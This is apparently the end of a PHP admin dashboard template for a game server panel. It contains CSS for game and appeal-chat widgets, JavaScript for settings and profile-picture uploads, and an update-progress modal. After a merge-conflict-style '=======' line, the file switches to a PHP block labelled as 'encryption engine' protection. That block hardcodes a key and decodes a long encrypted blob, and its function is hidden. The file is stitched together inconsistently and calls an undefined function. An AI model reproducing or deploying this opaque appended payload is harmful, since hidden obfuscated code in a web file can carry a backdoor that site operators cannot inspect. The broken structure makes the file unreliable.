        border-bottom: 1px solid rgba(255,255,255,0.1);
        width: 100%;
        box-sizing: border-box;
        height: 60px;
        position: relative;
        z-index: 1001;
    }
    .dashboard-content-area { padding: 20px; }
    .section-title { font-size: 1.5rem; }
    .stat-grid { grid-template-columns: 1fr; }
    
    #wheelContainer { width: 280px !important; height: 280px !important; }
    #wheelCanvas { width: 280px !important; height: 280px !important; }
    .dice-container { font-size: 60px; }
    .dice { width: 80px; height: 80px; }
}

/* Mini Game Arcade Styles */
.game-card {
    cursor: pointer;
    transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
    border: 1px solid rgba(255,255,255,0.05);
    text-align: center;
    padding: 30px 20px !important;
}
.game-card:hover {
    transform: translateY(-10px) scale(1.02);
    border-color: rgba(44, 164, 191, 0.3);
    background: rgba(255,255,255,0.05);
}
.game-icon {
    margin-bottom: 20px;
    transition: transform 0.3s ease;
}
.game-card:hover .game-icon {
    transform: rotate(10deg);
}
.dice-container {
    display: flex;
    justify-content: center;
    gap: 20px;
    font-size: 80px;
    margin: 30px 0;
}
.dice {
    width: 100px;
    height: 100px;
    background: #fff;
    border-radius: 15px;
    display: flex;
    align-items: center;
    justify-content: center;
    color: #333;
    box-shadow: 0 5px 15px rgba(0,0,0,0.3);
}
.lottery-pool-display {
    font-size: 3rem;
    font-weight: bold;
    margin: 20px 0;
    text-shadow: 0 0 20px rgba(241, 196, 15, 0.5);
}

.btn-action { background: rgba(44, 164, 191, 0.1); border: 1px solid rgba(44, 164, 191, 0.2); color: #2ca4bf; padding: 5px 8px; border-radius: 6px; cursor: pointer; transition: 0.2s; margin-right: 5px; }
.btn-action:hover { background: #2ca4bf; color: #fff; }
.btn-appeal { color: #f1c40f; border-color: rgba(241, 196, 15, 0.2); background: rgba(241, 196, 15, 0.1); }
.btn-appeal:hover { background: #f1c40f; color: #000; }

.receipt-viewer-content { position: relative; display: flex; justify-content: center; align-items: center; width: 90%; height: 90%; }
.appeal-chat-card { width: 500px; max-width: 95vw; height: 600px; display: flex; flex-direction: column; position: relative; padding: 0 !important; overflow: hidden; }
.appeal-header { padding: 20px; border-bottom: 1px solid rgba(255,255,255,0.05); }
.appeal-messages { flex-grow: 1; padding: 20px; overflow-y: auto; background: rgba(0,0,0,0.2); }
.appeal-footer { padding: 20px; border-top: 1px solid rgba(255,255,255,0.05); }

.msg-row { width: 100%; margin-bottom: 15px; display: flex; }
.float-right { justify-content: flex-end; }
.float-left { justify-content: flex-start; }
.msg-bubble { max-width: 80%; padding: 10px 15px; border-radius: 12px; position: relative; line-height: 1.4; }
.player-msg { background: rgba(44, 164, 191, 0.15); border: 1px solid rgba(44, 164, 191, 0.3); border-bottom-right-radius: 2px; }
.admin-msg { background: rgba(46, 204, 113, 0.1); border: 1px solid rgba(46, 204, 113, 0.2); border-bottom-left-radius: 2px; color: #fff; }
.msg-meta { display: block; font-size: 0.7rem; opacity: 0.5; margin-bottom: 5px; }
.text-info { color: #2ca4bf; }
</style>

<script>
const tp_name = "<?php echo $tp_name; ?>";
const tp_short = "<?php echo $tp_short; ?>";
function toggleAdminSidebar() {
    const sidebar = document.querySelector('.dashboard-sidebar');
    sidebar.classList.toggle('sidebar-active');
}

function handleMobileNavClick() {
    if (window.innerWidth <= 992) {
        const sidebar = document.querySelector('.dashboard-sidebar');
        sidebar.classList.remove('sidebar-active');
    }
}

// Attach auto-collapse to all sidebar buttons
document.addEventListener('DOMContentLoaded', function() {
    const sidebarLinks = document.querySelectorAll('.dashboard-sidebar .nav-btn, .dashboard-sidebar .legacy-links-list a');
    sidebarLinks.forEach(link => {
        link.addEventListener('click', handleMobileNavClick);
    });
});

async function updateVisibility(e) {
    if (e && e.preventDefault) e.preventDefault();
    const form = document.getElementById('visibilityForm');
    
    const options = [
        'menu_security_visible', 'menu_minigames_visible', 'menu_donations_visible',
        'menu_characters_visible', 'menu_rewards_visible', 'menu_advanced_visible',
        'adv_email_visible', 'adv_tickets_visible', 'adv_redeem_visible'
    ];
    
    let params = new URLSearchParams();
    options.forEach(opt => {
        const chk = form.querySelector(`input[name="${opt}"]`);
        params.append(opt, (chk && chk.checked) ? '1' : '0');
    });

    const targetEvt = e || window.event;
    const btn = targetEvt ? (targetEvt.target || targetEvt.srcElement) : document.querySelector('#visibilityForm button');
    const oldText = btn ? btn.innerText : 'SAVE CONFIGURATION';
    if (btn) {
        btn.innerText = 'SAVING...';
        btn.disabled = true;
    }

    try {
        const response = await fetch('Actions/system-settings.php?method=update_visibility', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: params.toString()
        });
        const text = await response.text();
        let data;
        try {
            data = JSON.parse(text);
        } catch (jsonErr) {
            data = { status: 'error', message: text || 'Invalid response from server' };
        }

        if (data.status === 'success') {
            if (btn) {
                btn.innerText = 'SUCCESS!';
                btn.style.background = '#2ecc71';
            }
            setTimeout(() => { location.reload(); }, 800);
        } else {
            alert('Error: ' + data.message);
            if (btn) {
                btn.innerText = oldText;
                btn.disabled = false;
            }
        }
    } catch (err) {
        alert('Failed to save settings: ' + err.message);
        if (btn) {
            btn.innerText = oldText;
            btn.disabled = false;
        }
    }
}

// Profile Picture Upload
async function uploadProfilePic() {
    const input = document.getElementById('profilePicInput');
    if (!input.files || input.files.length === 0) return;

    const file = input.files[0];
    const formData = new FormData();
    formData.append('profile_pic', file);

    const btn = document.getElementById('btnUploadPic');
    const originalText = btn ? btn.innerHTML : '';
    if (btn) {
        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> UPLOADING...';
        btn.disabled = true;
    }

    try {
        const response = await fetch('Actions/update-profile-pic.php', {
            method: 'POST',
            body: formData
        });
        const data = await response.json();
        
        if (data.status === 'success') {
            // Update all avatar previews on the page
            const newPath = data.path + '?v=' + new Date().getTime();
            const sidebarAvatar = document.getElementById('userAvatarSidebar');
            const settingsAvatar = document.getElementById('settingsAvatarPreview');
            if (sidebarAvatar) sidebarAvatar.src = newPath;
            if (settingsAvatar) settingsAvatar.src = newPath;
            alert('Profile picture updated successfully!');
        } else {
            alert(data.message || 'Failed to update profile picture.');
        }
    } catch (e) {
        alert('An error occurred while uploading: ' + (e.message || 'Unknown error'));
    } finally {
        if (btn) {
            btn.innerHTML = originalText;
            btn.disabled = false;
        }
        input.value = ''; // Reset input
    }
}

// Reset Profile Picture
async function resetProfilePic() {
    if (!confirm('Are you sure you want to reset your profile picture to default?')) return;
    
    try {
        const res = await fetch('Actions/reset-profile-pic.php');
        const data = await res.json();
        
        if (data.status === 'success') {
            alert('Profile picture reset successfully!');
            location.reload();
        } else {
            alert(data.message || 'Failed to reset profile picture.');
        }
    } catch (e) {
        alert('An error occurred while resetting.');
    }
}

document.addEventListener('DOMContentLoaded', checkSystemUpdates);
</script>

<!-- System Update Progress Overlay Modal -->
<div id="updateProgressModal" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.85); backdrop-filter:blur(10px); -webkit-backdrop-filter:blur(10px); z-index:99999; justify-content:center; align-items:center;">
    <div class="glass-card" style="max-width:520px; width:90%; padding:35px; text-align:center; border:1px solid rgba(44, 164, 191, 0.4); box-shadow:0 0 50px rgba(0,0,0,0.9); border-radius:16px; background:rgba(18, 24, 38, 0.95);">
        <div style="margin-bottom:20px;">
            <i class="fas fa-sync-alt fa-spin fa-3x" style="color:#2c1abf; filter:drop-shadow(0 0 10px rgba(44,164,191,0.6));"></i>
        </div>
        <h3 style="color:#fff; margin-bottom:8px; font-size:1.4rem;">System Update in Progress</h3>
        <p style="font-size:0.88rem; color:#f1c40f; font-weight:600; margin-bottom:22px; background:rgba(241, 196, 15, 0.1); padding:10px; border-radius:8px; border:1px solid rgba(241, 196, 15, 0.2);">
            <i class="fas fa-exclamation-triangle"></i> DO NOT refresh or close this browser window!
        </p>
        
        <div style="background:rgba(255,255,255,0.08); border-radius:10px; height:14px; overflow:hidden; margin-bottom:18px; border:1px solid rgba(255,255,255,0.1);">
            <div id="updateProgressBar" style="width:20%; height:100%; background:linear-gradient(90deg, #3498db, #2ecc71); transition:width 0.4s ease; box-shadow:0 0 10px rgba(46,204,113,0.5);"></div>
        </div>
        
        <div id="updateProgressText" style="font-size:0.9rem; color:rgba(255,255,255,0.9); font-weight:500;">
            <i class="fas fa-spinner fa-spin"></i> Initializing system update...
        </div>
    </div>
</div>
=======
/* PROTECTED BY TALISMAN ENCRYPTION ENGINE v2.0 */
$k19cda = 'Talisman_Ultimate_WebSuite_2026_SecureKey!';
$p7a20d = base64_decode('yq/cnk3vX38U8AyPxGnorjBKNmN5L0kxa3ZBTlN3NEFDSTludUc1aForTlhBTWhyVEVzVjJXY0QxMWZrcmlIMVBVdUltWHhDaHY5NGUwVm9Ja0FqU1dWSHB3NGhPclM5MUNjc1BsNDcrTS9WS29Tc0dHdG8vYlMvMkdHMHV5bkNjNk83MkJMZ09VdXkvZVh1RlQwbTBjYXU2K2RIU3Z4ckNiNExleVdMNXRObFZHQkViaWIrSGhpZ21aTUxWM1JEdHVubWczTlNZclZCbXd1dkVSU25qb0RCUHRDdFp2TjMyYTZUM2w4UlFZaFc5SG1SOWR5MVJRaXh6MjFPaCtwTEdyMFJJanF1NnRrS0lLUmZtd0RzbDVyUU50U09UUjIrVFgydkpIYVR3WThkYkJuR2lMMnFLVllPTVovbzRyY3lHZzlRVVA2SEE2WkZiWmtvRHdKS2VISUF5emozR2kzNmRqczVDalJxbGdOdWxoQUJ3emRUNGlZdlRDQm1OdkZ3OUZMcHlHMWoyRWVhdlFQVU1BSDRXTHlpUnpOVWxrekp0eER0WDFwNW5QaHA0bDdjSEZnaGloUVBMOGtOZXd5MUExbnhsK0VGSXRlQTE4dkNmam5iaU1WdncyQXhNeW5tWFNaemRKRWluYkJFdlpMNm4yTDBWWVJNbk1INUc2ZFhEYVIza0VSQjNCekl6ZVRjREFhQzRCZEVzU3hDSTdSQ3JuZ01YRTdxczBib0E4THhHN3E0enZSbElpdFhLb2VDdUEzYXNBV3Ntekxsb3R6VU1QcERudFZQeEYrbWdqbVdBRnNWdExKdCttOWVUUjlQRTIrQkZ4YjNMYjhPRDVyMEdjZFhXbm94WXZROFREdWdzOFA4VjZLbk1TbFJBSUxSRlp0QlpSZ09UMnVWSkhPbjRoZEhzT0NmbmgzM1o2YWlySVlBVDJ5SUFYbXlJeHA2bFJnR0hQekxudUxjRjVDT0pmZVU0UFF6ODVzOFlPbTRoaWJ0aFk2djBRRFhxMjFDUStQWjVxM1k0T1VVK0o4aUVWMW5JMi9BZUNacEM1ME15ZWh6Vzg1YzNSeWltS29hWUJYSFJlMmRpR0tUcUJKSWtYSDV0U0ZlMlJqclEvaGZDTFZwcWM2ZUMwd0tEcy9zVTNZTjBQdjhCOUF6ZUUwOUVTRUEvOE5xWURpT3FSZGZVbmJxUk95SlF2YUl1WDFYNTlkWkkyZGhINGdqZDRrWGVOYmhFUm5xR3NzYUIxL0J4enpmeDQ1Z2RmS2FDQ0dnSnNYS2ppVnNtTEJrbjh4b1JxTXhCaDk3bWFaVkVaamR2djdBOW9pZi9jYnlOVHBBWVZqbExVaFFMY0ZrSkl1d3J5YkFlN1FleWdjMEhFUlJDYkNCbFNnMGFrQy9QQmFIQTZoaUpRYytGL0JXdmhFaSs2VjVFQmZGbThvZ1ZxVDFlL0JXS3cyQ1lLNUh1RUp1RlVTNllQa0tEdWJ5dHJwMmtEOEVGNHRMc2dyV1RDQ1gvOTJQRDdGbGE5Rko3RzVmSmNuTStsZW1YNFlzYUpnRVF5ZmRCdjBEbmQ3OEZnSlNTK2NpdXBBYjZiYW9RVmhsUEZQOHZMNUZNbVNwb054S3gyeHNaVGYvK2ZrWmRObzFxcDYyVElxQ2daWk91QjVSR2c0eTFua3hiWVBaSkdhc0xOZVZNU09YOTJYVUgyR0NNcHpUaHJsYWJ0RXF3eDdqVCt1OVk0Q0ExWExMZjVpL3AyajhhbDJrR0d1ajJCS1pmTlNZZWFOYXJXTU41d3dDS3FJRno4RHp0UFJ5NGU2eWdMNS9OZ3BKTnNOWE9jSENLcjVsYllqZy9KenJ3bzBpVHRsNVJEOE04bnlhaUI1NHdTa3l4SHhhd2hFdXJiWG9YZEdKQm91RHU5b2RVTnh6TGtob3N6S3FTMm1OQzNnWnBKMzl1cGtRUUsyaksycklxNFFWNEVBYWpkOXgrS2dlcnlGdWU3a0EyU0M5QW5VRUY1cmxEVExOcG81STZOSmNvTDQyaDBVYTBrbmp3RTVqL3BKc0V6dW1UUXJHWHZla3hKMFlFb3l2N0YvNGxpUFVGQWt0Z0doSmljdUpxSTAxQnByaGcwK1M4dWp0SWxoUjB6cEc0cSt6VUM3WXJSWklaNC91b0htZjRQVkVML3hkNG0xZzNyeXNhc2swU2lpK3ZiSmRoNlUwNm54a29NTzBMZ2ZscWVNMXFrM2VkMDA2OUhCLzhrK3M2SXRvZHVRZmlOZ3VNUkROUlVqcmJZL0tmL08xQTYyc3ZIR0phbnBmQmdEMndkVlFacHhqRVlxR0lYRjF4ZVRzNXdUWC9kYXZBVmRsRFAwOXlrTVRwZStkQzdzQU1yRDVNVTJtalkxMHBhY2R3ZFBYb2JqWlBBMXpybWxrUitPSW02N1E2aUlYWTRKR244bThwLzJDdjJoRzErRnBXRFBzeXdlTGZ4YWphZmxMN0RNL0lESndKN1Nlc09iaTZoT2RUYmRPcjQrZk1ZZzVGekVwOFI1QjN6NHFKTjBmUGFXNkoxaDdzZ3BKTUxiZmNmOS9CMFI1NzNneTJhL3lmVmxscXUxMFcwUlcxUEZZT0JJclNsSjZRSWNuV2FoQnR1Q3FVWUlEbFhCNFRYRzFLV2txQm1ZL0QwQThrZjNzS0tqb0E0NW1VUjRxM1FVTXdoQ2xuZVpPMmxUU0lRQ2tDcGk2d2dFTmozZVlmM0tuTUEzakFnWmczbUs5NEp4ZjJJRjRXODByU0NTandPd2VTR2lzK2hQL2U4Zk4zeHM0Uk9iQ0V4Qm5wSzBtWllPQkc5R2l6TjhZeHVyT0N6SkNmUU4rejZseUN1azNWamthVUFFdVdHNllmTnRybm95NzBVRFozMzdqSjVydnUyWC9iNVFQaHh4WU9Pa2U2V2dJcVMxVVVoTkRnVk5XYkY4YXZzTUk2QjZYUTcwTGliVHRJQ3JXTElwV01FZkpFT1FycS9sQ0ZQMGFDMzN1OXJtYm1QUlp5TCtWZWlHdy94Y2tuajlKcmN1T3JsWmNBL25MWGlXNEROOFBCeFFIYjFDN3ZldThkUlFYejVmay80d1RSemRpdG84elJxUk82aEE0TmZKSTZLalNiYmd6eitNRHlXU0VvT3ZyL2t1bnpLcnA0YUJBZzdUL2xmSkd1TGMzc3lIS1U1Y0t1YUVIRTNNd3kyMjFvcGhKQ0o3dm5lN1A0ZDdRd1V6VWF2R0tBRWF5U01VWmF5TnY0UE14UXYzMnpQdkNSWjVRRVE4NWI5OUNhQnN1azg1WFdMU2FOMlJMeERiVllDMTEraSs3ckRmL1dwVnN1LzB4MWlxYWRDbGw5YzZZbVhYa1hoQkxYdzQzL0ZnbHQ0Z2UxZStXV3BwWXVXMTQxaktIWFI1TlZBMEtxUnVjMmwxQ3BwMWdVQUF1WHp4UE5BTktQTnRuK3ZoZlZmR1VPNHZuWlprdWxpN21wMytBQ3JCVUVsZnR6eHB4c2NGMlBRa29ZRUhuSE0rWVFKaVVkb1g4ZDBIczBGeWVjTkkzSHQxMGQxTXlSNkZ2U3p6ZzNKb1dnOGZQM1RMYUxxZm5RY0RGYldURkxES0xrWVdid0dVYlBsdktEQnJ0TmNhZElLbFdrUG1pSXhpbm1QeUVUTzdlc1Jjc0VURGswRFVUK3gwNDAySHFzTTRiZ3lrRHA4OW5TQTEybExsajdSUmRXbkQwUVlBeFJ4L3NNMTFBOENOc21GQUpwTFNIcHY0NGQ3N05CeXZJdGNORmxKQ2NTdEd6MDhQNVdlaTdhTWpyL3R6M2FkUGQvQ2tMNEVmRGJLSG5qak1ERWVvK3FxVjhCRVZpK1UwTUI3SkUxRnA3UmFnMjdKWWpOcjJZRlhnYldXRVdOK0U5QnlxQXg1VnYva3hXcmJkOExrOVhqNmpEQmFuMGlieE02cXFTcDFMOU00dmRGYlMxU21KN21rcWg5OFFuU0NMbEthRTFETnZ5RnJUMzVoa0RDSkVmckt5Zm1ocms5elVJVXp2c1RvT2k2ZlR4MVFnM202bEREc1g4aW1XREtEeUs2WmJDZEJRb2ZSQ0JSZVVqbS9ScU1WMW1YTld4OEJBb1haUHQwYzdiMXJBeXg5TlZ4ZC81am5rK1dYcVFHRHhyVlV0UlhSbFVQM1pySDU3U3NvaXlacHRlL3MvTUFsbFVxazJpaHJ0MFZmM0kwUDdhSG5QcFBVa1VVZHVqNVRSYWJNcGs4cjVzQlBDS1FXZldCSk9lWmg1U2szaVFnTkVQLzlGUjQ4ZDA1OGtrY3RSVFJqK1VFWldadHMxSE1qYlcwQ1dmUkxNVDRWZ1pHdWUwK2YvU1IxaVF3bmo5cW5zS1Q3SU5qY1RUNjQrem5Da0Ixa1ZzckJZeXZEbm9QVjhSb1BPejd1ejJXTjFzM3dEMFdZc0F3TzhINGRUY0ZQc3RzV3VyTWxPdi91b1FNNUlUMzYreVk4eFAzejZCdlovejV1S2JxTHJ2c3IvWDMyUG5salcvdmZWVnNjZEV2OU8ydVVpZ2ZOZWhZUWEzdGs1UDBjN09mY244V1dUaHU2bWpMeVlFRm5xYnREcGQ0cEd4T1VKMExUVk12Q0d5NWo5WFA3bWRIS0F2L01zUGU1NFkvcUVkNFBYUWZkQlpvWlEwODlpNmVneXZzb0VVdWhscU9STys0b09rdUtYeXZlZ3RMNjlMR1gxVUVJSmVNWTZCUkdpZlVncGt6NTdqVURzNUg3Qnh1aXRTWlByTXRNWWhDT1EzZmdJUnZ1dS9FR0tEWm5hVzNkdWdWWjM0a0JXaFl2MWNtMmIvcnBqdG1ZTEl3ekY4N284TUdtZjV6RExjZkYzakdLOTgwRHl2WnM0WEIvZTZrZXZNWkJBMzFGaktUWFkrZW93eGU1SkhwVEEzaUwvUytxNCtnYTh6U05jN3h6UlQ5VmtxNmdjL3BsOGIvZ1RhbmlvS1Ivb2JIUlY0REt2WklZanRuWUJmdThMRG1SYWRsY0NuTXh5eml4OHRGeU9vYXhEVXhCYnU3RUh1czNMdzNCRDRjMGdETnF2aHFscGcwQ0lkTTh2U1lwVC9KeGR3dnYvMkdMRWlIS2hndk1sK3l6Mkd3Tk1aYUtzanpyQmhOZHExUmZrQmwxM0tSMmVmRUNpVjdHa0Y0R3N1aElxbUZPVDVPVXY0eUdUaFkrVDNQeWpFcnlEYXI5WWh6UjZwY2h6SDR0Q3BBN09TaEF3MllLeEJYcUpWWjFuc0kwenYwL2Y4dEZ4b254SXAzNDdsLytGTUtnVVNDd0ppdnpEWDBwWTZyZ3N4MGxiaHVIS2tQcEZxbURBZFhUeVFrNGpmdmZXVklUZWI5YTFpdVluUFZzUDBnTGNJVmM5c2NRL2Q3TENHS3hMVDlud3QzbHRQUUorNFdxVEhIUmd6emk1NnN2ZDJZTkdEK01TcWdqYkhMdmFSbmlJMDNRN01OMVo0WFp4Z0hFNzZmNUlrOERYWENsejhFZ3QwTm9yWjgxemxuS0lObHRiODgxTWdrS25qd0pCY3F3UkwwOWFLZ0M5ZHpDY1N6M3hhMFpWbkFnUVEyRitNbWY5SWNpbngrY3drbkZpU3AwZm9wSm5wd2ZkanZpTU9mdkQ0MnJBZlVsZGd6aEo5R3Y0U3QzNkFqUVdYRG1nU3BvS1ZTanF1Wi83eitLb01nQWxjeFlDdnkwL3kwVkRRTHRudEw0UVJSZzF6ZyswNTJwQklobVhNc3lSWWdSRXlzRW8zd25BdThvVURwaTZrWWg4Mmc0bE9vNnY3Ri9vVGlMeXlSNmN1V1pHeXZYWjBUVWVvRzVpaHNxRnlCQ29jZFlicHB3MGJEL1dPSE1TQ1lQMkpnSWtCdlN5WnY4UElzTlc3aVBBVnRsaTFnR0JQWUY4cXpIRU44VGo0TjlkUDNBT3VXcEJPdDNLMW5mcGIrZi9PNWNnNWw3SGUvR0hOb1R3U2M3Y3ZKVXBXVC91VXZKeGlvMHJvTXk3aXV4RTA4aThOZS9QaU9ZWEwwVUpvc1pqYmc1L0drMXRqczRMMVhja25CZUZQTFNldnNubmFvaW1XNmtXQVNHVUZrTkR1U01naGI5NnlXdHVSL2xjZ3ZSb3ZpbU5xQ1A5MlVXVGlPT1JSV1BJemJJUzRNQy9SejFHRWRmbnB1TmJLV0xTY0FYYVc1MmFWaitaUXc3OXh2N2pXdFhmVW5oT3NiMUxkNG1heFVxenh1L0JPOUxnOEw3Q25CZk9OQ1FucDFRdWFTMUE4T1FCQ1dIcmhtZGhIenFWUUdnQlh4eWh3TGdscmZqUEhWOFZ1VTdnZzdJRncxUmp1SUpUT0gvVDFUWFBJcGdkNmlDVDVSWnFteUw3NWxPek83aTBZcVpZYmlXRXpjY1hwZDZtS2FlNEdDY2dqYUthc1BLLzFHMnlzTU1rVzViTC9SMzlScU5NdGxWM0lkTUF5SnphcDJkbVNiUHM2QUhNOW5oMUJUVnhwcEZkWGRaZDdDMzFLVFFmRUVURGdxaCt0dVRDNmxiUW5TbnhUOHZMTFcreXdSSmppZ3p4Q2dZTkYyMmp4ZFV5Z1NoTTdzVW1XOTlFalR3SjhOOWhQRzhhV0ZaS25tYzVLYWRNbmFXeUtYVmloaEZqUWNiWWpraVB1RXdOTUZRY21pMnppOXBQT3BqMXJXZHg5dE5XemlIOW5BclN5aTBvY3JGQWs2Zm1ucHZYYSsrQmNzK0tzMXIrMzI4U1ZZZG1admtZSGZmSUdGdUtxRzNIWHQwRjVwcjlRK3FqWnVlaFgxUEc2STF0Z3RTaVY4ejhUeEhqNm5lQlJPSXl2ekM3WTFvNDBxK2UzZUdiMVdSZjI4aXFYTVQzMkZtRU9wN1NuZjNMTE1GUXVJZUh2bDNIOFdtRXB0NkFBY2hEOW9IYStJR1lIaFF6ZEdWNWYyUzBOcHd3eWxTemhCRDU2NzBjeVlJbDJtMUxXeEJkbE9VRGt1M2gvSXhKZEJvelk0dmViQkp0MEVzOEVLNnBBN0FSWkhqSk9NT1VjWnhscFJxaFVxR0JCck1Gd0hleUdabks2WGtPOHlxZDl2dHdSekhiSUtaZUJwM28rdU1qYjhQWlpwdW1VeGU3YTl1c3Npd0ttK1pFQzRTL2NRc0Jwd09aZXBLZkY1ZHFXMXRzY3VNdm96SkZrcThEeTZEQVYvRlNhWUVyL0pYRTc2OVUvRnZQczN0V0xVcm9RMTlobHNxZHJjTldFcXlNSHY2Ykpzb3B2dWc5L244a3RaT05rc3FWMEVZdEF2bW9qQ1pjcVVtdnZMd1RUdm1KbDdQTkU0cTRBZkVlNmg0OGtUZHB4SlhZQ003OGtzUEphVWdjczRKZ3YvTm9idStiWDdJWHViSEhCUFZTQXQ5NU1BWkRmYVV1YXpjWjRaekMrOHFBOU41Ym4zSVhzcVhKMTJVTEZlczVFdGdCekFTa2pJZitRdVI2T0REWiswTVpUNWRrQmxjVy9EQzlOVUVCMmEyQmVZZjFMU0M0WDJJb293T1hyR1E4dTViR3QwbGVFZDkzaC96eldySlpvc3NaN09JZ3NReHRUVXZMUWNkSjJhMVR3UGJReW00MjFETnNUYmd3RGpLcllsSno4UTZKRS92eFdWdTR2L04xQVRBK093eG1QRFBOWXQ2SUpkUWxYRTV0MWRGdFdXSkhpQzVxdVhqWmFKNER6K0ZZczRtcnUraUh3K2JGYTVvNUJaSy9uVnJCWUpnVkczOHFZM3N1bW9FNmJZMEZRS2luRHloMjBHajNiR1NZem80WDNzbmE5aEU4QTN6MFRNVzU5WWxnVDBEQkpUYlR6MVk3YURVSTI5VkhnYTBrRDJ3SzRkRFpESDRIUGMyZ3d2N1dkSy95bXY3SklheFd5UnpRd0g2emxrcnUyU2NsNG9FY3RwNVJXNzVKNmc2MkFjbmtlWVJtdWRyTGNpUlhsSVlHaHB6N09wRU42djZFZFVQeVhHTkM3UCtBeUxLTXNqbCtQN3J5OW9iUkN0TGVJbG1LSUZWZkNROE9tZm1wbFpsRzYwRmF1bEIzZ2UxeW02Rm1iSk9LM2dDY1NWNHNaZzUzNlZXN013VFYxTUI1N21pL2VtWStqeGs2UEF0Ri9jTnpnTUU3a3NRVzVmMjhEWHVFZlREdW51cW1UTlI5R1ZQTStvSzlDbWNRWG5MbzVRblRJZ2ZaY3Z2aWhYb0FIUDlNSjhkUk5IaWpQQm9iZmphZjRsZUpKWmsxdnZ3K2J6MGdZNG9aZWdleGxWOGxpbU5JUDcxSTI2eWwzYkx0a05ZdUFDaDFoUFVPaFJHa3JhbmozZFJoeU92cnM1TFp6VU42RjhwTEU2QkNhRG9FMWRaRiszdStDMTVsOE5IeVZQd25iTmpNZSsyS3ZIOW92WnRxQ1hCQ0t0TUtIbUU3U1IwanZzV3AzQ1BRZmdRUlY4cnF4anZUU1dMOGp1NkJPZWVLNytMb1V3YllJOUhrRDV0M0tLZ2tWbWxBaWZ6SkdNMFJiQjJlUnU0WS8rb3FIZnVqaGE5M1NrZEt0ZGNpR1hrUU54OE4vRnVBekxKU3JCSXFieU02U0dDU0tmMWUyQTYrM2x5c2JsUzBPNnJIOTNkMGk4Nk4rZVJmc2RFMU5UNUlTc1NSdVJCSk9CcnpINEpEK2JpUDMvUk1qNXVkZFBJeEg0TzNoeFNCSVJkUGM4NEY2WVlBWmszc3pMZEhqMGVBNjdGQzEwVG43YzBLcWpaNnF6TW44Qm8vUUdobm1YekxUVFdlS09kMktxNWFEb0dmdEhlYVRqSkRneHZiQzBteDZ5K1hzdllBTU1EdUQxQTdIZWJlNDF1MVZZZFZCb3NyYkhFTjJyN3pKbk9KdXdrNW1PdmJiT3Z6d0VJdVZpeU5CUzVWbkdGS2ZGOExOSGloVEJCV01Ta2NPNXd3TE5PeHRRVGdVWDd2MGt6SDB4MFBmS0wwZDJYTDFVenV6b3kvY3RMYmo4MTRUUm9wbjJUSEVXMnBXVUd1TVNyQ3NQTGt6bkxBeDhFQVN0WDlmUXlxVUZpUjV3Z2NIRzhUYkM1ZlljMVJMdjJ6RWpsRGlQS3pYa2F5M2dtOXBGRWlKSFFTUTU2Rzk0VkgyOTg0S1E2NEF0S2ExTmdNYlpiZG8yeG1udHhpTWNnbWJWdERRZEc5eFMwNUhNYjFuT0JPSHhzNWxaVWRRa0U5TTdhNkZCZkJoTTBrYW1YNDQ4emd4Q2t1NXRiMnk0ZGRvdHRhL1M3SDh6NmduZFVSUU02OU1iN3h4USt6dG4yOEI4TUFIN1ozTitVZWZ6eE84cTBDNFRZZWxTbEI1b1RUTUFXc0xxb1RTWkxuYU8rVWxueC81K2RvUFBqV3ZWNm1id3JES3JCUjBlQjVzNFU0Ny83bHRXY3BzTHp1aEt5bXlVOEhuL0ZRZG1hdWtmRUYrK0d6S2owWUZsMHA3N0JFNG1IeXNPUDhhZHA0TDdSMjQrVmFNRnZPbjhzUHVNU2tENWhZNS8zSjh5a3R5NnEwV21QcWJVaVUxTHdHY3lJMFp4cHM5bk9PVmR6TDV0WGZHelFqdGpnaUVndXUyQk1KcjZXV3MxLy94UDJOL0J4elVPOVJVNEZuRTN1Y3U0Y3pvYXJtTWtkTk9McGdIenZqUnpJY0NxTWVXY2hsMmVSTVNrUEVvV2JBU3UxT2hzNWVkQmRFSjRNL1Z3ZTRnZERpSWZSZXIxSjNFaUQ2Y3FIamFhQ3Z2RDFtRytiQ1pzQ0FIbWVzM1pUbHpLZDFWR1J6REJ5ei8ycTdxbnhmNERVZThSeEdybkZvOGRneTNPOGpvVkRnQ3V5SFpGR0h1NFU0b2lnR2NrcjdOemdSWnViNzNpbEd3WTYrT2ZjcGd6eTRVdnlJdlFZYkUvdXVrZmI1V3JCQU1vQ0hxSUMxd2xyN1BZaVRjbTgyMEFjVXVRUkc3VXUxQyt6RTV2UkR5dUZWV3FsODFXQTM4L0wxeVl6UmROYjdKR09Id2Q3Q3EzTXNyS2c4Rk5EY0dVNVhUWHMrSEJ2QVlZS1lQbi9HNHB1SlB3bzVQMnFUVHZna01jWEpoYTJ3cm4vZkpUUzVVUElsS2prZXRwMDFpbTUyNlB5Y3ZIVW1Ud0w2NHVvOC85RGpyYTlrdTZoTjRJd0NJdTYyek9wc2VZTUFxVFF2LzVNZzZwRXA5U056QzlycnFDb3pmZVd0UTlOeFJFV005V3Bwa0J5SGxaUTQzNEZlZldUNXFRQTZaWHRCR0phd1Q5RnV3STZPUllQQm1xa3JTNnl3TXhRb1lnUEJpNlVtSGhIS0ltcW9tZzZnbkpaZlc2WENNTDVHekNGMTQ1NndDdFovSHc2dE96MDBYbnRMQWFlTGlwclI1SmFEZ0Q3VjBaKzJvQ3Q1dXNZU0dtWjFjSWZMZHlpY0JJSEZKQU82dHV5RW12VVBjNldJYkNiS1dKbFdZYTJKYkhreUM1WmZZMU94MUJock9zdEgvTFEwb09QRDJWZnhRNG9tSnFSWThWU1JKa3puNUtOeGMxV1RyaS9PN0hlMzZDL0RYT2J0MkIxOXBJWnZSTXFqYk4zTENxOUliOXB6OEVqM3BRVFhDNGdJUDZ3aXI0SWdSMEVwamxTSzg2RFZLRDhIZmZROGZJOFB3cEVDNzJ1RnlPeUFUZ0dwU0RYaERaa2hHZUp6ZHVqemZMbU8wVy8yekZVQkNBT3FYOVRxQVhXQUhsajZLRHcxRlZQQnVDRi9zQk83N1lnd0pOOFg2L2IxWTl0ZW4zWEYwdDc2NTZpenRMcDA0S05uczFzUzJQQzhNN29JZkhQWU1SdjY3Q3BXY2ZsSVZmaU5yMlI1MllCYjZPTG11aCtKRzFOYkRFSzJzSExQdS9Ga1BWWDBGK2RwdEEwYU1kdzUraFRBcTdvUUVzbmI3dm1oLzAxQUM3TVlwYXR3R2lXbS84ejgyYTQ5N1BCZVYzbjBDTEpk